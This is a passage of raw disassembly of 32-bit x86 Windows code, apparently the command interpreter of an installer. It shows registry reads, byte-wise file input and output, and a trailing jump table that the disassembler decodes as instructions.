  4024ed:	ff 75 e4             	push   -0x1c(%ebp)
  4024f0:	e8 9d 0c 00 00       	call   0x403192
  4024f5:	50                   	push   %eax
  4024f6:	57                   	push   %edi
  4024f7:	ff 75 c8             	push   -0x38(%ebp)
  4024fa:	53                   	push   %ebx
  4024fb:	ff 75 88             	push   -0x78(%ebp)
  4024fe:	ff 75 08             	push   0x8(%ebp)
  402501:	ff 15 0c 80 40 00    	call   *0x40800c
  402507:	85 c0                	test   %eax,%eax
  402509:	75 03                	jne    0x40250e
  40250b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40250e:	ff 75 08             	push   0x8(%ebp)
  402511:	e9 cf 00 00 00       	jmp    0x4025e5
  402516:	68 19 00 02 00       	push   $0x20019
  40251b:	e8 ee 06 00 00       	call   0x402c0e
  402520:	6a 33                	push   $0x33
  402522:	8b f8                	mov    %eax,%edi
  402524:	e8 a5 06 00 00       	call   0x402bce
  402529:	3b fb                	cmp    %ebx,%edi
  40252b:	88 1e                	mov    %bl,(%esi)
  40252d:	0f 84 8c 02 00 00    	je     0x4027bf
  402533:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402536:	c7 45 c8 00 04 00 00 	movl   $0x400,-0x38(%ebp)
  40253d:	51                   	push   %ecx
  40253e:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402541:	56                   	push   %esi
  402542:	51                   	push   %ecx
  402543:	53                   	push   %ebx
  402544:	50                   	push   %eax
  402545:	57                   	push   %edi
  402546:	ff 15 08 80 40 00    	call   *0x408008
  40254c:	33 c9                	xor    %ecx,%ecx
  40254e:	41                   	inc    %ecx
  40254f:	85 c0                	test   %eax,%eax
  402551:	75 2e                	jne    0x402581
  402553:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  402557:	74 13                	je     0x40256c
  402559:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  40255c:	74 06                	je     0x402564
  40255e:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402562:	75 1d                	jne    0x402581
  402564:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402567:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40256a:	eb 72                	jmp    0x4025de
  40256c:	ff 36                	push   (%esi)
  40256e:	33 c0                	xor    %eax,%eax
  402570:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402573:	56                   	push   %esi
  402574:	0f 94 c0             	sete   %al
  402577:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40257a:	e8 07 3c 00 00       	call   0x406186
  40257f:	eb 63                	jmp    0x4025e4
  402581:	88 1e                	mov    %bl,(%esi)
  402583:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  402586:	eb 5c                	jmp    0x4025e4
  402588:	68 19 00 02 00       	push   $0x20019
  40258d:	e8 7c 06 00 00       	call   0x402c0e
  402592:	6a 03                	push   $0x3
  402594:	8b f8                	mov    %eax,%edi
  402596:	e8 11 06 00 00       	call   0x402bac
  40259b:	3b fb                	cmp    %ebx,%edi
  40259d:	59                   	pop    %ecx
  40259e:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4025a1:	88 1e                	mov    %bl,(%esi)
  4025a3:	0f 84 16 02 00 00    	je     0x4027bf
  4025a9:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4025ac:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4025b1:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4025b4:	74 0c                	je     0x4025c2
  4025b6:	51                   	push   %ecx
  4025b7:	56                   	push   %esi
  4025b8:	50                   	push   %eax
  4025b9:	57                   	push   %edi
  4025ba:	ff 15 04 80 40 00    	call   *0x408004
  4025c0:	eb 1c                	jmp    0x4025de
  4025c2:	53                   	push   %ebx
  4025c3:	53                   	push   %ebx
  4025c4:	53                   	push   %ebx
  4025c5:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4025c8:	53                   	push   %ebx
  4025c9:	51                   	push   %ecx
  4025ca:	56                   	push   %esi
  4025cb:	50                   	push   %eax
  4025cc:	57                   	push   %edi
  4025cd:	ff 15 30 80 40 00    	call   *0x408030
  4025d3:	85 c0                	test   %eax,%eax
  4025d5:	74 07                	je     0x4025de
  4025d7:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4025de:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  4025e4:	57                   	push   %edi
  4025e5:	ff 15 10 80 40 00    	call   *0x408010
  4025eb:	e9 6a 04 00 00       	jmp    0x402a5a
  4025f0:	56                   	push   %esi
  4025f1:	e8 a9 3b 00 00       	call   0x40619f
  4025f6:	3b c3                	cmp    %ebx,%eax
  4025f8:	0f 84 5c 04 00 00    	je     0x402a5a
  4025fe:	50                   	push   %eax
  4025ff:	e9 bc f9 ff ff       	jmp    0x401fc0
  402604:	6a ed                	push   $0xffffffed
  402606:	e8 c3 05 00 00       	call   0x402bce
  40260b:	ff 75 e0             	push   -0x20(%ebp)
  40260e:	ff 75 dc             	push   -0x24(%ebp)
  402611:	50                   	push   %eax
  402612:	e8 aa 37 00 00       	call   0x405dc1
  402617:	83 f8 ff             	cmp    $0xffffffff,%eax
  40261a:	0f 84 9d 01 00 00    	je     0x4027bd
  402620:	50                   	push   %eax
  402621:	e9 43 ef ff ff       	jmp    0x401569
  402626:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402629:	74 14                	je     0x40263f
  40262b:	33 ff                	xor    %edi,%edi
  40262d:	47                   	inc    %edi
  40262e:	57                   	push   %edi
  40262f:	e8 78 05 00 00       	call   0x402bac
  402634:	59                   	pop    %ecx
  402635:	89 55 c8             	mov    %edx,-0x38(%ebp)
  402638:	a2 20 a8 40 00       	mov    %al,0x40a820
  40263d:	eb 0f                	jmp    0x40264e
  40263f:	6a 11                	push   $0x11
  402641:	e8 88 05 00 00       	call   0x402bce
  402646:	50                   	push   %eax
  402647:	e8 f2 3b 00 00       	call   0x40623e
  40264c:	8b f8                	mov    %eax,%edi
  40264e:	38 1e                	cmp    %bl,(%esi)
  402650:	0f 84 69 01 00 00    	je     0x4027bf
  402656:	56                   	push   %esi
  402657:	e8 43 3b 00 00       	call   0x40619f
  40265c:	57                   	push   %edi
  40265d:	68 20 a8 40 00       	push   $0x40a820
  402662:	50                   	push   %eax
  402663:	e8 00 38 00 00       	call   0x405e68
  402668:	e9 41 ef ff ff       	jmp    0x4015ae
  40266d:	6a 02                	push   $0x2
  40266f:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402672:	e8 35 05 00 00       	call   0x402bac
  402677:	83 f8 01             	cmp    $0x1,%eax
  40267a:	59                   	pop    %ecx
  40267b:	89 55 c8             	mov    %edx,-0x38(%ebp)
  40267e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402681:	0f 8c d3 03 00 00    	jl     0x402a5a
  402687:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  40268c:	3b c1                	cmp    %ecx,%eax
  40268e:	7e 03                	jle    0x402693
  402690:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402693:	38 1e                	cmp    %bl,(%esi)
  402695:	0f 84 82 00 00 00    	je     0x40271d
  40269b:	56                   	push   %esi
  40269c:	88 5d 0b             	mov    %bl,0xb(%ebp)
  40269f:	e8 fb 3a 00 00       	call   0x40619f
  4026a4:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  4026a7:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4026aa:	7e 71                	jle    0x40271d
  4026ac:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4026af:	8d 45 f3             	lea    -0xd(%ebp),%eax
  4026b2:	6a 01                	push   $0x1
  4026b4:	50                   	push   %eax
  4026b5:	ff 75 d0             	push   -0x30(%ebp)
  4026b8:	e8 7c 37 00 00       	call   0x405e39
  4026bd:	85 c0                	test   %eax,%eax
  4026bf:	74 5f                	je     0x402720
  4026c1:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4026c4:	75 21                	jne    0x4026e7
  4026c6:	80 7d 0b 0d          	cmpb   $0xd,0xb(%ebp)
  4026ca:	74 2b                	je     0x4026f7
  4026cc:	80 7d 0b 0a          	cmpb   $0xa,0xb(%ebp)
  4026d0:	74 25                	je     0x4026f7
  4026d2:	8a 45 f3             	mov    -0xd(%ebp),%al
  4026d5:	88 04 3e             	mov    %al,(%esi,%edi,1)
  4026d8:	46                   	inc    %esi
  4026d9:	3a c3                	cmp    %bl,%al
  4026db:	88 45 0b             	mov    %al,0xb(%ebp)
  4026de:	74 40                	je     0x402720
  4026e0:	3b 75 f4             	cmp    -0xc(%ebp),%esi
  4026e3:	7c ca                	jl     0x4026af
  4026e5:	eb 39                	jmp    0x402720
  4026e7:	0f b6 45 f3          	movzbl -0xd(%ebp),%eax
  4026eb:	50                   	push   %eax
  4026ec:	57                   	push   %edi
  4026ed:	e8 94 3a 00 00       	call   0x406186
  4026f2:	e9 6c 03 00 00       	jmp    0x402a63
  4026f7:	8a 45 f3             	mov    -0xd(%ebp),%al
  4026fa:	38 45 0b             	cmp    %al,0xb(%ebp)
  4026fd:	74 0e                	je     0x40270d
  4026ff:	3c 0d                	cmp    $0xd,%al
  402701:	74 04                	je     0x402707
  402703:	3c 0a                	cmp    $0xa,%al
  402705:	75 06                	jne    0x40270d
  402707:	88 04 3e             	mov    %al,(%esi,%edi,1)
  40270a:	46                   	inc    %esi
  40270b:	eb 13                	jmp    0x402720
  40270d:	6a 01                	push   $0x1
  40270f:	53                   	push   %ebx
  402710:	6a ff                	push   $0xffffffff
  402712:	ff 75 d0             	push   -0x30(%ebp)
  402715:	ff 15 50 81 40 00    	call   *0x408150
  40271b:	eb 03                	jmp    0x402720
  40271d:	8b 75 f8             	mov    -0x8(%ebp),%esi
  402720:	88 1c 3e             	mov    %bl,(%esi,%edi,1)
  402723:	3b f3                	cmp    %ebx,%esi
  402725:	e9 86 ee ff ff       	jmp    0x4015b0
  40272a:	38 1e                	cmp    %bl,(%esi)
  40272c:	0f 84 28 03 00 00    	je     0x402a5a
  402732:	6a 02                	push   $0x2
  402734:	e8 73 04 00 00       	call   0x402bac
  402739:	59                   	pop    %ecx
  40273a:	89 55 c8             	mov    %edx,-0x38(%ebp)
  40273d:	ff 75 e4             	push   -0x1c(%ebp)
  402740:	53                   	push   %ebx
  402741:	50                   	push   %eax
  402742:	56                   	push   %esi
  402743:	e8 57 3a 00 00       	call   0x40619f
  402748:	50                   	push   %eax
  402749:	ff 15 50 81 40 00    	call   *0x408150
  40274f:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402752:	0f 8c 02 03 00 00    	jl     0x402a5a
  402758:	e9 46 02 00 00       	jmp    0x4029a3
  40275d:	56                   	push   %esi
  40275e:	e8 3c 3a 00 00       	call   0x40619f
  402763:	3b c3                	cmp    %ebx,%eax
  402765:	0f 84 ef 02 00 00    	je     0x402a5a
  40276b:	50                   	push   %eax
  40276c:	ff 15 40 81 40 00    	call   *0x408140
  402772:	e9 e3 02 00 00       	jmp    0x402a5a
  402777:	57                   	push   %edi
  402778:	e8 22 3a 00 00       	call   0x40619f
  40277d:	3b c3                	cmp    %ebx,%eax
  40277f:	74 12                	je     0x402793
  402781:	8d 8d 30 fe ff ff    	lea    -0x1d0(%ebp),%ecx
  402787:	51                   	push   %ecx
  402788:	50                   	push   %eax
  402789:	ff 15 58 81 40 00    	call   *0x408158
  40278f:	85 c0                	test   %eax,%eax
  402791:	75 3f                	jne    0x4027d2
  402793:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40279a:	88 1e                	mov    %bl,(%esi)
  40279c:	e9 b9 02 00 00       	jmp    0x402a5a
  4027a1:	6a 02                	push   $0x2
  4027a3:	e8 26 04 00 00       	call   0x402bce
  4027a8:	8d 8d 30 fe ff ff    	lea    -0x1d0(%ebp),%ecx
  4027ae:	51                   	push   %ecx
  4027af:	50                   	push   %eax
  4027b0:	ff 15 5c 81 40 00    	call   *0x40815c
  4027b6:	83 f8 ff             	cmp    $0xffffffff,%eax
  4027b9:	75 10                	jne    0x4027cb
  4027bb:	88 1f                	mov    %bl,(%edi)
  4027bd:	88 1e                	mov    %bl,(%esi)
  4027bf:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4027c6:	e9 8f 02 00 00       	jmp    0x402a5a
  4027cb:	50                   	push   %eax
  4027cc:	57                   	push   %edi
  4027cd:	e8 b4 39 00 00       	call   0x406186
  4027d2:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  4027d8:	50                   	push   %eax
  4027d9:	56                   	push   %esi
  4027da:	e9 39 01 00 00       	jmp    0x402918
  4027df:	6a f0                	push   $0xfffffff0
  4027e1:	c7 45 f4 66 fd ff ff 	movl   $0xfffffd66,-0xc(%ebp)
  4027e8:	e8 e1 03 00 00       	call   0x402bce
  4027ed:	8b f0                	mov    %eax,%esi
  4027ef:	56                   	push   %esi
  4027f0:	89 75 88             	mov    %esi,-0x78(%ebp)
  4027f3:	e8 35 34 00 00       	call   0x405c2d
  4027f8:	85 c0                	test   %eax,%eax
  4027fa:	75 07                	jne    0x402803
  4027fc:	6a ed                	push   $0xffffffed
  4027fe:	e8 cb 03 00 00       	call   0x402bce
  402803:	56                   	push   %esi
  402804:	e8 93 35 00 00       	call   0x405d9c
  402809:	6a 02                	push   $0x2
  40280b:	68 00 00 00 40       	push   $0x40000000
  402810:	56                   	push   %esi
  402811:	e8 ab 35 00 00       	call   0x405dc1
  402816:	83 f8 ff             	cmp    $0xffffffff,%eax
  402819:	89 45 08             	mov    %eax,0x8(%ebp)
  40281c:	0f 84 9d 00 00 00    	je     0x4028bf
  402822:	a1 58 47 42 00       	mov    0x424758,%eax
  402827:	8b 35 28 81 40 00    	mov    0x408128,%esi
  40282d:	50                   	push   %eax
  40282e:	6a 40                	push   $0x40
  402830:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402833:	ff d6                	call   *%esi
  402835:	8b f8                	mov    %eax,%edi
  402837:	3b fb                	cmp    %ebx,%edi
  402839:	74 7b                	je     0x4028b6
  40283b:	53                   	push   %ebx
  40283c:	e8 d8 0b 00 00       	call   0x403419
  402841:	ff 75 d0             	push   -0x30(%ebp)
  402844:	57                   	push   %edi
  402845:	e8 b9 0b 00 00       	call   0x403403
  40284a:	ff 75 e0             	push   -0x20(%ebp)
  40284d:	6a 40                	push   $0x40
  40284f:	ff d6                	call   *%esi
  402851:	8b f0                	mov    %eax,%esi
  402853:	3b f3                	cmp    %ebx,%esi
  402855:	89 75 c8             	mov    %esi,-0x38(%ebp)
  402858:	74 3a                	je     0x402894
  40285a:	ff 75 e0             	push   -0x20(%ebp)
  40285d:	56                   	push   %esi
  40285e:	53                   	push   %ebx
  40285f:	ff 75 dc             	push   -0x24(%ebp)
  402862:	e8 2b 09 00 00       	call   0x403192
  402867:	eb 1e                	jmp    0x402887
  402869:	8b 0e                	mov    (%esi),%ecx
  40286b:	8b 46 04             	mov    0x4(%esi),%eax
  40286e:	83 c6 08             	add    $0x8,%esi
  402871:	51                   	push   %ecx
  402872:	03 c7                	add    %edi,%eax
  402874:	56                   	push   %esi
  402875:	50                   	push   %eax
  402876:	89 8d 74 ff ff ff    	mov    %ecx,-0x8c(%ebp)
  40287c:	e8 fb 34 00 00       	call   0x405d7c
  402881:	03 b5 74 ff ff ff    	add    -0x8c(%ebp),%esi
  402887:	38 1e                	cmp    %bl,(%esi)
  402889:	75 de                	jne    0x402869
  40288b:	ff 75 c8             	push   -0x38(%ebp)
  40288e:	ff 15 24 81 40 00    	call   *0x408124
  402894:	ff 75 d0             	push   -0x30(%ebp)
  402897:	57                   	push   %edi
  402898:	ff 75 08             	push   0x8(%ebp)
  40289b:	e8 c8 35 00 00       	call   0x405e68
  4028a0:	57                   	push   %edi
  4028a1:	ff 15 24 81 40 00    	call   *0x408124
  4028a7:	53                   	push   %ebx
  4028a8:	53                   	push   %ebx
  4028a9:	ff 75 08             	push   0x8(%ebp)
  4028ac:	6a ff                	push   $0xffffffff
  4028ae:	e8 df 08 00 00       	call   0x403192
  4028b3:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4028b6:	ff 75 08             	push   0x8(%ebp)
  4028b9:	ff 15 20 81 40 00    	call   *0x408120
  4028bf:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  4028c2:	6a f3                	push   $0xfffffff3
  4028c4:	5e                   	pop    %esi
  4028c5:	7d 13                	jge    0x4028da
  4028c7:	6a ef                	push   $0xffffffef
  4028c9:	5e                   	pop    %esi
  4028ca:	ff 75 88             	push   -0x78(%ebp)
  4028cd:	ff 15 60 81 40 00    	call   *0x408160
  4028d3:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4028da:	56                   	push   %esi
  4028db:	e9 fd f9 ff ff       	jmp    0x4022dd
  4028e0:	53                   	push   %ebx
  4028e1:	e8 c6 02 00 00       	call   0x402bac
  4028e6:	3b 05 8c 47 42 00    	cmp    0x42478c,%eax
  4028ec:	59                   	pop    %ecx
  4028ed:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4028f0:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4028f3:	0f 83 c6 fe ff ff    	jae    0x4027bf
  4028f9:	8b f0                	mov    %eax,%esi
  4028fb:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4028fe:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  402904:	03 35 88 47 42 00    	add    0x424788,%esi
  40290a:	3b c3                	cmp    %ebx,%eax
  40290c:	7c 17                	jl     0x402925
  40290e:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  402911:	75 0f                	jne    0x402922
  402913:	83 c6 18             	add    $0x18,%esi
  402916:	56                   	push   %esi
  402917:	57                   	push   %edi
  402918:	e8 0b 39 00 00       	call   0x406228
  40291d:	e9 38 01 00 00       	jmp    0x402a5a
  402922:	51                   	push   %ecx
  402923:	eb 7f                	jmp    0x4029a4
  402925:	83 c9 ff             	or     $0xffffffff,%ecx
  402928:	2b c8                	sub    %eax,%ecx
  40292a:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40292d:	74 10                	je     0x40293f
  40292f:	6a 01                	push   $0x1
  402931:	e8 76 02 00 00       	call   0x402bac
  402936:	59                   	pop    %ecx
  402937:	89 55 88             	mov    %edx,-0x78(%ebp)
  40293a:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40293d:	eb 10                	jmp    0x40294f
  40293f:	ff 75 e8             	push   -0x18(%ebp)
  402942:	8d 46 18             	lea    0x18(%esi),%eax
  402945:	50                   	push   %eax
  402946:	e8 70 39 00 00       	call   0x4062bb
  40294b:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  40294f:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402952:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402955:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402958:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40295b:	0f 84 f9 00 00 00    	je     0x402a5a
  402961:	ff 75 c4             	push   -0x3c(%ebp)
  402964:	e8 14 e8 ff ff       	call   0x40117d
  402969:	e9 ec 00 00 00       	jmp    0x402a5a
  40296e:	53                   	push   %ebx
  40296f:	e8 38 02 00 00       	call   0x402bac
  402974:	83 f8 20             	cmp    $0x20,%eax
  402977:	59                   	pop    %ecx
  402978:	89 55 c8             	mov    %edx,-0x38(%ebp)
  40297b:	0f 83 3e fe ff ff    	jae    0x4027bf
  402981:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  402984:	74 29                	je     0x4029af
  402986:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402989:	74 12                	je     0x40299d
  40298b:	50                   	push   %eax
  40298c:	e8 08 e9 ff ff       	call   0x401299
  402991:	53                   	push   %ebx
  402992:	53                   	push   %ebx
  402993:	e8 57 e8 ff ff       	call   0x4011ef
  402998:	e9 bd 00 00 00       	jmp    0x402a5a
  40299d:	53                   	push   %ebx
  40299e:	e8 3f e9 ff ff       	call   0x4012e2
  4029a3:	50                   	push   %eax
  4029a4:	57                   	push   %edi
  4029a5:	e8 dc 37 00 00       	call   0x406186
  4029aa:	e9 ab 00 00 00       	jmp    0x402a5a
  4029af:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4029b2:	74 15                	je     0x4029c9
  4029b4:	8b 15 54 47 42 00    	mov    0x424754,%edx
  4029ba:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4029bd:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  4029c4:	e9 91 00 00 00       	jmp    0x402a5a
  4029c9:	8b 0d 54 47 42 00    	mov    0x424754,%ecx
  4029cf:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  4029d6:	57                   	push   %edi
  4029d7:	e8 df 38 00 00       	call   0x4062bb
  4029dc:	eb 7c                	jmp    0x402a5a
  4029de:	6a 05                	push   $0x5
  4029e0:	e8 4c 3c 00 00       	call   0x406631
  4029e5:	6a 22                	push   $0x22
  4029e7:	8b f0                	mov    %eax,%esi
  4029e9:	e8 e0 01 00 00       	call   0x402bce
  4029ee:	3b f3                	cmp    %ebx,%esi
  4029f0:	74 38                	je     0x402a2a
  4029f2:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4029f5:	51                   	push   %ecx
  4029f6:	50                   	push   %eax
  4029f7:	e8 7f 38 00 00       	call   0x40627b
  4029fc:	59                   	pop    %ecx
  4029fd:	85 c0                	test   %eax,%eax
  4029ff:	59                   	pop    %ecx
  402a00:	7c 28                	jl     0x402a2a
  402a02:	8d 45 08             	lea    0x8(%ebp),%eax
  402a05:	50                   	push   %eax
  402a06:	53                   	push   %ebx
  402a07:	ff 75 e4             	push   -0x1c(%ebp)
  402a0a:	8d 45 bc             	lea    -0x44(%ebp),%eax
  402a0d:	50                   	push   %eax
  402a0e:	ff d6                	call   *%esi
  402a10:	85 c0                	test   %eax,%eax
  402a12:	7c 16                	jl     0x402a2a
  402a14:	ff 75 08             	push   0x8(%ebp)
  402a17:	57                   	push   %edi
  402a18:	e8 48 38 00 00       	call   0x406265
  402a1d:	59                   	pop    %ecx
  402a1e:	59                   	pop    %ecx
  402a1f:	ff 75 08             	push   0x8(%ebp)
  402a22:	ff 15 94 82 40 00    	call   *0x408294
  402a28:	eb 30                	jmp    0x402a5a
  402a2a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402a31:	88 1f                	mov    %bl,(%edi)
  402a33:	eb 25                	jmp    0x402a5a
  402a35:	8b 0d 50 1d 42 00    	mov    0x421d50,%ecx
  402a3b:	53                   	push   %ebx
  402a3c:	23 c8                	and    %eax,%ecx
  402a3e:	51                   	push   %ecx
  402a3f:	6a 0b                	push   $0xb
  402a41:	ff 75 f8             	push   -0x8(%ebp)
  402a44:	ff 15 60 82 40 00    	call   *0x408260
  402a4a:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402a4d:	74 0b                	je     0x402a5a
  402a4f:	53                   	push   %ebx
  402a50:	53                   	push   %ebx
  402a51:	ff 75 f8             	push   -0x8(%ebp)
  402a54:	ff 15 50 82 40 00    	call   *0x408250
  402a5a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402a5d:	01 05 e8 47 42 00    	add    %eax,0x4247e8
  402a63:	33 c0                	xor    %eax,%eax
  402a65:	5f                   	pop    %edi
  402a66:	5e                   	pop    %esi
  402a67:	5b                   	pop    %ebx
  402a68:	c9                   	leave
  402a69:	c2 04 00             	ret    $0x4
  402a6c:	65 2a 40 00          	sub    %gs:0x0(%eax),%al
  402a70:	90                   	nop
  402a71:	14 40                	adc    $0x40,%al
  402a73:	00 9c 14 40 00 b7 14 	add    %bl,0x14b70040(%esp,%edx,1)
  402a7a:	40                   	inc    %eax
  402a7b:	00 ca                	add    %cl,%dl
  402a7d:	14 40                	adc    $0x40,%al
  402a7f:	00 d6                	add    %dl,%dh
  402a81:	14 40                	adc    $0x40,%al
  402a83:	00 f4                	add    %dh,%ah
  402a85:	14 40                	adc    $0x40,%al
  402a87:	00 6f 15             	add    %ch,0x15(%edi)
  402a8a:	40                   	inc    %eax
  402a8b:	00 9d 15 40 00 bb    	add    %bl,-0x44ffbfeb(%ebp)
  402a91:	15 40 00 59 16       	adc    $0x16590040,%eax
  402a96:	40                   	inc    %eax
  402a97:	00 02                	add    %al,(%edx)
  402a99:	15 40 00 41 15       	adc    $0x15410040,%eax
  402a9e:	40                   	inc    %eax
  402a9f:	00 62 15             	add    %ah,0x15(%edx)
  402aa2:	40                   	inc    %eax
  402aa3:	00 6a 16             	add    %ch,0x16(%edx)
  402aa6:	40                   	inc    %eax
  402aa7:	00 bb 16 40 00 1f    	add    %bh,0x1f004016(%ebx)
  402aad:	17                   	pop    %ss
  402aae:	40                   	inc    %eax
  402aaf:	00 46 17             	add    %al,0x17(%esi)
  402ab2:	40                   	inc    %eax
  402ab3:	00 59 17             	add    %bl,0x17(%ecx)
  402ab6:	40                   	inc    %eax
  402ab7:	00 fd                	add    %bh,%ch
  402ab9:	18 40 00             	sbb    %al,0x0(%eax)
  402abc:	00 19                	add    %bl,(%ecx)
  402abe:	40                   	inc    %eax
  402abf:	00 32                	add    %dh,(%edx)
  402ac1:	19 40 00             	sbb    %eax,0x0(%eax)
  402ac4:	47                   	inc    %edi
  402ac5:	19 40 00             	sbb    %eax,0x0(%eax)
  402ac8:	59                   	pop    %ecx
  402ac9:	19 40 00             	sbb    %eax,0x0(%eax)
  402acc:	ed                   	in     (%dx),%eax
  402acd:	19 40 00             	sbb    %eax,0x0(%eax)
  402ad0:	1e                   	push   %ds
  402ad1:	1a 40 00             	sbb    0x0(%eax),%al
  402ad4:	5e                   	pop    %esi
  402ad5:	1a 40 00             	sbb    0x0(%eax),%al
  402ad8:	9e                   	sahf
  402ad9:	1a 40 00             	sbb    0x0(%eax),%al
  402adc:	63 1b                	arpl   %ebx,(%ebx)
  402ade:	40                   	inc    %eax
  402adf:	00 87 1b 40 00 2e    	add    %al,0x2e00401b(%edi)
  402ae5:	1c 40                	sbb    $0x40,%al
  402ae7:	00 2e                	add    %ch,(%esi)
  402ae9:	1c 40                	sbb    $0x40,%al
  402aeb:	00 fe                	add    %bh,%dh
  402aed:	1c 40                	sbb    $0x40,%al
  402aef:	00 1f                	add    %bl,(%edi)
  402af1:	1d 40 00 44 1d       	sbb    $0x1d440040,%eax
  402af6:	40                   	inc    %eax
  402af7:	00 65 1d             	add    %ah,0x1d(%ebp)
  402afa:	40                   	inc    %eax
  402afb:	00 35 1e 40 00 c5    	add    %dh,0xc500401e
  402b01:	1e                   	push   %ds
  402b02:	40                   	inc    %eax
  402b03:	00 f9                	add    %bh,%cl
  402b05:	1e                   	push   %ds
  402b06:	40                   	inc    %eax
  402b07:	00 7b 1f             	add    %bh,0x1f(%ebx)
  402b0a:	40                   	inc    %eax
  402b0b:	00 cb                	add    %cl,%bl
  402b0d:	1f                   	pop    %ds
  402b0e:	40                   	inc    %eax
  402b0f:	00 fb                	add    %bh,%bl
  402b11:	1f                   	pop    %ds
  402b12:	40                   	inc    %eax
  402b13:	00 9c 20 40 00 6b 21 	add    %bl,0x216b0040(%eax,%eiz,1)
  402b1a:	40                   	inc    %eax
  402b1b:	00 eb                	add    %ch,%bl
  402b1d:	22 40 00             	and    0x0(%eax),%al
  402b20:	6d                   	insl   (%dx),%es:(%edi)
  402b21:	23 40 00             	and    0x0(%eax),%eax
  402b24:	9c                   	pushf
  402b25:	23 40 00             	and    0x0(%eax),%eax
  402b28:	e0 23                	loopne 0x402b4d
  402b2a:	40                   	inc    %eax
  402b2b:	00 21                	add    %ah,(%ecx)
  402b2d:	24 40                	and    $0x40,%al
  402b2f:	00 76 24             	add    %dh,0x24(%esi)
  402b32:	40                   	inc    %eax
  402b33:	00 16                	add    %dl,(%esi)
  402b35:	25 40 00 88 25       	and    $0x25880040,%eax
  402b3a:	40                   	inc    %eax
  402b3b:	00 f0                	add    %dh,%al
  402b3d:	25 40 00 04 26       	and    $0x26040040,%eax
  402b42:	40                   	inc    %eax
  402b43:	00 26                	add    %ah,(%esi)
  402b45:	26 40                	es inc %eax
  402b47:	00 6d 26             	add    %ch,0x26(%ebp)
  402b4a:	40                   	inc    %eax
  402b4b:	00 2a                	add    %ch,(%edx)
  402b4d:	27                   	daa
  402b4e:	40                   	inc    %eax
  402b4f:	00 5d 27             	add    %bl,0x27(%ebp)
  402b52:	40                   	inc    %eax
  402b53:	00 77 27             	add    %dh,0x27(%edi)
  402b56:	40                   	inc    %eax
  402b57:	00 a1 27 40 00 df    	add    %ah,-0x20ffbfd9(%ecx)
  402b5d:	27                   	daa
  402b5e:	40                   	inc    %eax
  402b5f:	00 e0                	add    %ah,%al
  402b61:	28 40 00             	sub    %al,0x0(%eax)
  402b64:	6e                   	outsb  %ds:(%esi),(%dx)
  402b65:	29 40 00             	sub    %eax,0x0(%eax)
  402b68:	de 29                	fisubrs (%ecx)
  402b6a:	40                   	inc    %eax
  402b6b:	00 5a 2a             	add    %bl,0x2a(%edx)
  402b6e:	40                   	inc    %eax
  402b6f:	00 35 2a 40 00 ce    	add    %dh,0xce00402a
  402b75:	1a 40 00             	sbb    0x0(%eax),%al
  402b78:	d5 1a                	aad    $0x1a
  402b7a:	40                   	inc    %eax
  402b7b:	00 dc                	add    %bl,%ah
  402b7d:	1a 40 00             	sbb    0x0(%eax),%al
  402b80:	e1 1a                	loope  0x402b9c
  402b82:	40                   	inc    %eax
  402b83:	00 f1                	add    %dh,%cl
  402b85:	1a 40 00             	sbb    0x0(%eax),%al
  402b88:	f5                   	cmc
  402b89:	1a 40 00             	sbb    0x0(%eax),%al
  402b8c:	f9                   	stc
